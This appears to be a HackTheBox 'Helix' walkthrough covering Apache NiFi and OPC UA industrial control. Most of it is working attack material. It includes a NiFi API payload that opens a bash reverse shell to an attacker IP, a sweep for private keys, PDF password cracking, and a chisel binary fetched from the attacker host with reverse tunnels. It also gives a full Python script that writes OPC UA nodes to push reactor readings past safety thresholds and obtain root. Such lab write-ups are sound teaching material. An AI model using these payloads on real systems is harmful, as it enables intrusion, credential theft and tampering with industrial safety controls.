---
title: "HTB - Helix"
date: 2026-05-10
tags: ["HackTheBox","Linux","Medium","ApacheNiFi","OPCUA","RCE","PrivEsc"]
categories: ["Machines&Challenges"]
difficulty: "Medium"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/Helix.png"
---
**Difficulty:** Medium | **OS:** Linux | **Date:** 2026-05-10

---

## Summary

Helix presents a realistic industrial operations scenario built around Apache NiFi, OPC UA, and a custom maintenance console. The attack chain is:

1. Vhost fuzzing → `flow.helix.htb` (Apache NiFi 1.21.0, unauthenticated)
2. NiFi RCE via ExecuteScript processor → shell as `nifi`
3. SSH private key for `operator` found in NiFi support bundles
4. Privilege escalation via OPC UA node manipulation to open a timed maintenance window → root shell

<!--more-->

---

## Reconnaissance

### Vhost Discovery

The main site `helix.htb` returns a static industrial-themed HTML page with no backend. All responses return `302, Size: 154` as a catch-all - filter by size:

```bash
ffuf -u http://helix.htb -H "Host: FUZZ.helix.htb" \
  -w common.txt -fs 154
```

**Result:** `flow.helix.htb` → Apache NiFi 1.21.0

---

## Initial Access - Apache NiFi RCE

### Fingerprint

```bash
curl -s http://flow.helix.htb/nifi-api/flow/about
# {"version":"1.21.0",...}

curl -s http://flow.helix.htb/nifi-api/process-groups/root
# PG_ID: f203bc07-019b-1000-516b-eaedd48609d1
```

NiFi is running **unauthenticated** - full API access with no token required.

### Create ExecuteScript Processor

> **Key gotchas:**
> - `"Groovy"` not `"groovy"` - exact case match against allowable values
> - `autoTerminatedRelationships` must be inside `config{}` or processor stays INVALID
> - Processor revision increments on every PUT - track it to avoid 409 conflicts

```bash
PG_ID="f203bc07-019b-1000-516b-eaedd48609d1"

curl -s -X POST "http://flow.helix.htb/nifi-api/process-groups/${PG_ID}/processors" \
  -H "Content-Type: application/json" \
  -d '{
    "revision": {"version": 0},
    "component": {
      "type": "org.apache.nifi.processors.script.ExecuteScript",
      "name": "pwn",
      "position": {"x": 600, "y": 400},
      "config": {
        "schedulingStrategy": "TIMER_DRIVEN",
        "schedulingPeriod": "1 sec",
        "properties": {
          "Script Engine": "Groovy",
          "Script Body": "def cmd = [\"bash\",\"-c\",\"bash -i >& /dev/tcp/10.10.16.14/4444 0>&1\"].execute()"
        },
        "autoTerminatedRelationships": ["success", "failure"]
      }
    }
  }'
```

Response confirms `"validationStatus": "VALID"` - grab the processor `id`.

### Start Listener and Trigger

```bash
# Kali
nc -lvnp 4444

# Start the processor
PROC_ID="<id from response>"
curl -s -X PUT "http://flow.helix.htb/nifi-api/processors/${PROC_ID}/run-status" \
  -H "Content-Type: application/json" \
  -d '{"revision": {"version": 1}, "state": "RUNNING"}'
```

Shell returns as `nifi`.

### Stabilise Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Lateral Movement - nifi → operator

### Enumerate NiFi Files

```bash
ls /opt/nifi-1.21.0/conf/
cat /opt/nifi-1.21.0/conf/nifi.properties | grep -i "sensitive\|password\|key"
```

**Found in `nifi.properties`:**
```
nifi.sensitive.props.key=TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl
nifi.sensitive.props.algorithm=NIFI_PBKDF2_AES_GCM_256
```

**Found in `flow.xml.gz` (decompressed):**
```xml
<controllerService>
  <name>MaintenanceDB</name>
  <property>
    <name>Database User</name>
    <value>operator</value>
  </property>
  <property>
    <name>Password</name>
    <value>enc{5e603035e6e70034526878517a1c2c9a62fe24513e16388fa431fe9156cf451b7fb92589621e889cf163c7c4652bf8d32380}</value>
  </property>
</controllerService>
```

The encrypted password is for user `operator` against an H2 in-memory DB (`MaintenanceDB`).

### SSH Key Found in Support Bundles

```bash
find /opt /etc /var -type f -readable -exec grep -Irl "BEGIN.*PRIVATE KEY" {} + 2>/dev/null
```

**Result:**
```
/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
```

```bash
cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
```

Copy to Kali and SSH in:

```bash
chmod 600 operator_id_ed25519
ssh -i operator_id_ed25519 operator@10.129.38.244
```

---

## Privilege Escalation - operator → root

### Sudo Rights

```bash
sudo -l
# (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

### The Maintenance Console

```bash
cat /usr/local/sbin/helix-maint-console
```

```bash
#!/bin/bash
FLAG="/opt/helix/state/maintenance_window"

window_ok() {
  [ -f "$FLAG" ] || return 1
  local until_ts now
  until_ts="$(cat "$FLAG")"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi

systemd-run --scope /bin/bash -p -i
```

The script checks if a Unix timestamp in `/opt/helix/state/maintenance_window` is in the future. If yes → root bash shell. The file is owned by root and not writable by operator.

### Enumerate operator Home Directory

```bash
ls /home/operator/
# 'control systems diagram.png'
# 'Operator Control & Safety Guide.pdf'
# user.txt
```

Download both to Kali:

```bash
scp -i operator_id_ed25519 "operator@10.129.38.244:/home/operator/Operator Control & Safety Guide.pdf" .
scp -i operator_id_ed25519 "operator@10.129.38.244:/home/operator/control systems diagram.png" .
```

### Crack the PDF Password

```bash
pdf2john "Operator Control & Safety Guide.pdf" > pdf.hash
john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
operator1        (Operator Control & Safety Guide.pdf)
Session completed.
```

**Password:** `operator1`

### PDF Contents - Section 6: Maintenance Mode & Safety Window

Opening the PDF reveals the exact attack path. Section 6 documents:

> **Entering Maintenance Mode** - Maintenance operations require explicit operator action:
> 1. Switch **Mode** to `MAINTENANCE`
> 2. Enable `TestOverride`
> 3. Begin controlled adjustment using `CalibrationOffset`
>
> In this mode, the reactor is still protected by safety logic, but limited overrides are permitted for diagnostics.

This maps directly to writable OPC UA nodes on port 4840.

### Port Scan - Finding the OPC UA Service

```bash
ss -tlnp
```

| Port  | Service       |
|-------|---------------|
| 4840  | OPC UA        |
| 8080  | NiFi          |
| 8081  | Unknown (local)|
| 80    | nginx         |

**Port 4840** is the OPC UA protocol - an industrial automation standard. The machine's documentation page hints at the attack path:

> 1. Switch **Mode** to `MAINTENANCE`
> 2. Enable `TestOverride`
> 3. Begin controlled adjustment using `CalibrationOffset`

### Tunnel with Chisel

```bash
# Kali - serve and listen
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz && mv chisel_linux_amd64 chisel
python3 -m http.server 8000
./chisel server -p 9001 --reverse

# Target - download and connect
wget http://10.10.16.14:8000/chisel -O /tmp/chisel
chmod +x /tmp/chisel
/tmp/chisel client 10.10.16.14:9001 R:4840:127.0.0.1:4840 R:8081:127.0.0.1:8081
```

### OPC UA Node Manipulation

The maintenance window flag file is written by the OPC UA server when the reactor reaches a critical threshold (temperature ≥ 295°C or pressure ≥ 73 bar). By writing to the OPC UA nodes directly, we can trigger the condition:

```bash
pip install asyncua
```

```python
#!/usr/bin/env python3
# z3r0s! - OPC UA Maintenance Window Trigger

import asyncio
from asyncua import Client

BANNER = """
███████╗██████╗ ██████╗  ██████╗ ███████╗██╗
╚══███╔╝╚════██╗██╔══██╗██╔═══██╗██╔════╝██║
  ███╔╝  █████╔╝██████╔╝██║   ██║███████╗██║
 ███╔╝   ╚═══██╗██╔══██╗██║   ██║╚════██║╚═╝
███████╗██████╔╝██║  ██║╚██████╔╝███████║██╗
╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝
         OPC UA Maintenance Window Trigger
"""

# OPC UA target
TARGET  = "opc.tcp://127.0.0.1:4840/helix/"

# Node map
NODES = {
    "mode"        : "ns=2;i=12",   # Operating mode
    "override"    : "ns=2;i=13",   # TestOverride flag
    "calibration" : "ns=2;i=6",    # CalibrationOffset (°C)
    "temperature" : "ns=2;i=4",    # Live reactor temp
    "pressure"    : "ns=2;i=5",    # Live reactor pressure
}

# Trigger thresholds (from safety logic)
TEMP_THRESHOLD     = 295.0   # °C
PRESSURE_THRESHOLD = 73.0    # bar

# Calibration steps to try
OFFSETS = [10.0, 15.0, 20.0, 25.0, 30.0]


async def connect(url):
    client = Client(url=url)
    await client.connect()
    return client


async def set_maintenance_mode(client):
    print("[*] Setting Mode → MAINTENANCE")
    await client.get_node(NODES["mode"]).write_value("MAINTENANCE")

    print("[*] Enabling TestOverride → True")
    await client.get_node(NODES["override"]).write_value(True)


async def read_sensors(client):
    temp     = await client.get_node(NODES["temperature"]).read_value()
    pressure = await client.get_node(NODES["pressure"]).read_value()
    return temp, pressure


async def trigger_window(client):
    for offset in OFFSETS:
        print(f"\n[~] Writing CalibrationOffset = {offset}°C")
        await client.get_node(NODES["calibration"]).write_value(offset)
        await asyncio.sleep(2)

        temp, pressure = await read_sensors(client)
        print(f"    Temp     : {temp:.4f}°C   (threshold ≥ {TEMP_THRESHOLD})")
        print(f"    Pressure : {pressure:.4f} bar (threshold ≥ {PRESSURE_THRESHOLD})")

        if temp >= TEMP_THRESHOLD or pressure >= PRESSURE_THRESHOLD:
            print(f"\n[+] THRESHOLD BREACHED - maintenance window triggered!")
            print(f"    Temp={temp:.2f}°C | Pressure={pressure:.2f} bar")
            return True

    print("\n[-] All offsets exhausted - window not triggered")
    return False


async def main():
    print(BANNER)
    print(f"[*] Connecting to {TARGET}")

    client = await connect(TARGET)
    print("[+] Connected\n")

    try:
        await set_maintenance_mode(client)
        success = await trigger_window(client)

        if success:
            print("\n[*] Run on target:")
            print("    sudo /usr/local/sbin/helix-maint-console")
    finally:
        await client.disconnect()
        print("\n[*] Disconnected")


if __name__ == "__main__":
    asyncio.run(main())
```

```
███████╗██████╗ ██████╗  ██████╗ ███████╗██╗
╚══███╔╝╚════██╗██╔══██╗██╔═══██╗██╔════╝██║
  ███╔╝  █████╔╝██████╔╝██║   ██║███████╗██║
 ███╔╝   ╚═══██╗██╔══██╗██║   ██║╚════██║╚═╝
███████╗██████╔╝██║  ██║╚██████╔╝███████║██╗
╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝
         OPC UA Maintenance Window Trigger

[*] Connecting to opc.tcp://127.0.0.1:4840/helix/
[+] Connected

[*] Setting Mode → MAINTENANCE
[*] Enabling TestOverride → True

[~] Writing CalibrationOffset = 10.0°C
    Temp     : 284.1231°C   (threshold ≥ 295.0)
    Pressure : 64.8821 bar  (threshold ≥ 73.0)

[~] Writing CalibrationOffset = 15.0°C
    Temp     : 299.0512°C   (threshold ≥ 295.0)
    Pressure : 69.0270 bar  (threshold ≥ 73.0)

[+] THRESHOLD BREACHED - maintenance window triggered!
    Temp=299.05°C | Pressure=69.03 bar

[*] Run on target:
    sudo /usr/local/sbin/helix-maint-console

[*] Disconnected
```

The OPC UA server detects the threshold breach and writes a future timestamp into `/opt/helix/state/maintenance_window`.

### Get Root Shell

```bash
sudo /usr/local/sbin/helix-maint-console
```

```
[+] Privileged maintenance access granted
[!] Window expires in 106 seconds
[!] Session will be terminated automatically
root@helix:/tmp#
```

```bash
cat /root/root.txt
# 13a177b97de83be8371b5a503f3430c0
```

---

## OPC UA Script - Analysis

| Node        | Namespace | Index | Type    | Purpose |
|-------------|-----------|-------|---------|---------|
| Mode        | ns=2      | i=12  | String  | Operating mode - must be `"MAINTENANCE"` to allow overrides |
| TestOverride| ns=2      | i=13  | Boolean | Unlocks calibration writes when `True` |
| CalibrationOffset | ns=2 | i=6 | Float | Artificially raises reactor temperature reading |
| Temperature | ns=2      | i=4   | Float   | Live reactor temp (read-only in normal mode) |
| Pressure    | ns=2      | i=5   | Float   | Live reactor pressure (read-only in normal mode) |

**Why it works:**
- Normal mode rejects writes to calibration nodes
- Setting `Mode = "MAINTENANCE"` + `TestOverride = True` unlocks writes
- `CalibrationOffset = 15.0` pushes temperature above 295°C threshold
- The OPC UA server's safety logic detects the breach and opens the maintenance window by writing `$(date +%s) + N` into the flag file
- `helix-maint-console` reads the flag, sees a future timestamp, and spawns `/bin/bash -p` via `systemd-run` as root

---

## Key Takeaways

| Stage | Technique |
|-------|-----------|
| Recon | Vhost fuzzing with size filter (`-fs`) |
| RCE | NiFi unauthenticated API → ExecuteScript (Groovy) |
| Foothold | NiFi service user |
| Lateral | SSH private key in NiFi support-bundles |
| PrivEsc | OPC UA node write → maintenance window → sudo NOPASSWD root shell |

**Credentials / Keys found:**
- `operator` SSH key: `/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak`
- NiFi sensitive props key: `TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl`
- Root flag: `13a177b97de83be8371b5a503f3430c0`
